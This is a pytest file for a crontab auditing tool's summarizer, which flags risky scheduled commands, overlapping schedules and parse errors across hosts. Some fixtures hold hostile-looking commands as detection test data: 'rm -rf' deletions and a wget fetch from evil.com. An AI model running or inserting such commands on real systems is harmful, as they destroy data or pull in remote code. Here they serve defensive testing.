"""Tests for crontab_audit.summarizer."""

import pytest
from crontab_audit.parser import CrontabEntry
from crontab_audit.loader import HostCrontab
from crontab_audit.summarizer import (
    summarize_host,
    summarize_all,
    HostSummaryStats,
    MultiHostSummary,
)


def make_entry(minute="0", hour="*", dom="*", month="*", dow="*",
               command="/usr/bin/backup", host="web1"):
    e = CrontabEntry(
        minute=minute, hour=hour, dom=dom, month=month, dow=dow,
        command=command, raw=f"{minute} {hour} {dom} {month} {dow} {command}",
    )
    e.host = host
    return e


def make_host(hostname, entries=None, parse_errors=None):
    return HostCrontab(
        hostname=hostname,
        entries=entries or [],
        parse_errors=parse_errors or [],
    )


def test_summarize_host_basic_counts():
    host = make_host("web1", entries=[
        make_entry(command="/usr/bin/backup"),
        make_entry(minute="5", command="/usr/bin/report"),
    ])
    stats = summarize_host(host)
    assert stats.hostname == "web1"
    assert stats.total_entries == 2
    assert stats.parse_error_count == 0


def test_summarize_host_risky_entry_detected():
    host = make_host("db1", entries=[
        make_entry(command="rm -rf /tmp/old"),
    ])
    stats = summarize_host(host)
    assert stats.risky_count >= 1
    assert any("rm" in cmd for cmd in stats.risk_commands)


def test_summarize_host_no_issues():
    host = make_host("safe1", entries=[
        make_entry(command="/usr/bin/safe-script"),
    ])
    stats = summarize_host(host)
    assert stats.risky_count == 0
    assert stats.overlap_count == 0


def test_summarize_host_parse_errors_counted():
    host = make_host("broken", entries=[], parse_errors=["bad line 1", "bad line 2"])
    stats = summarize_host(host)
    assert stats.parse_error_count == 2


def test_summarize_host_overlapping_entries():
    entry1 = make_entry(minute="0", hour="*", command="/bin/job1")
    entry2 = make_entry(minute="0", hour="*", command="/bin/job2")
    host = make_host("overlap_host", entries=[entry1, entry2])
    stats = summarize_host(host)
    assert stats.overlap_count >= 1


def test_summarize_all_totals():
    host1 = make_host("h1", entries=[make_entry(command="/bin/a"), make_entry(command="/bin/b")])
    host2 = make_host("h2", entries=[make_entry(command="rm -rf /x")])
    summary = summarize_all([host1, host2])
    assert summary.total_hosts == 2
    assert summary.total_entries == 3
    assert summary.total_risky >= 1


def test_summarize_all_empty():
    summary = summarize_all([])
    assert summary.total_hosts == 0
    assert summary.total_entries == 0
    assert summary.total_risky == 0
    assert summary.hosts_with_issues == []


def test_hosts_with_issues_filters_correctly():
    clean = make_host("clean", entries=[make_entry(command="/usr/bin/ok")])
    risky = make_host("risky", entries=[make_entry(command="wget http://evil.com/x")])
    summary = summarize_all([clean, risky])
    assert "risky" in summary.hosts_with_issues


def test_by_hostname_lookup():
    host = make_host("lookup_host", entries=[make_entry()])
    summary = summarize_all([host])
    mapping = summary.by_hostname()
    assert "lookup_host" in mapping
    assert isinstance(mapping["lookup_host"], HostSummaryStats)


def test_host_summary_stats_str():
    stats = HostSummaryStats(
        hostname="srv1", total_entries=5, risky_count=2,
        overlap_count=1, parse_error_count=0
    )
    result = str(stats)
    assert "srv1" in result
    assert "risky=2" in result
    assert "overlaps=1" in result
